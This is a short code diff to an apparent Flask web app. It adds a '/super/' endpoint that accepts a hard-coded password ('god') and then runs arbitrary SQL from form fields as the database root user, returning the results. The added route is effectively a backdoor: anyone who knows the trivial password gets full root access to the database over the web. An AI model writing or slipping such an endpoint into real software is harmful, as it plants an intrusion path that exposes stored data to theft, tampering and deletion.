@@ -190,6 +190,22 @@ def error500(error):
     return 'Ohno server crashed!'
 
 
+@app.route('/super/', methods=['POST', 'GET'])
+def super():
+    if request.method == 'GET':
+        return render_template('super.html')
+    else:
+        if request.form.get('password') != 'god':
+            return 'Password Wrong'
+        stmtq = request.form.get('SQLQ')
+        if stmtq != "":
+            result = str(mt.root_sql_query(user='root', stmt=stmtq))
+            return result
+        stmta = request.form.get('SQLA')
+        mt.root_sql_query(user='root', stmt=stmta)
+        return 'OK'
+
+
 if __name__ == '__main__':
 
     if DEBUG:
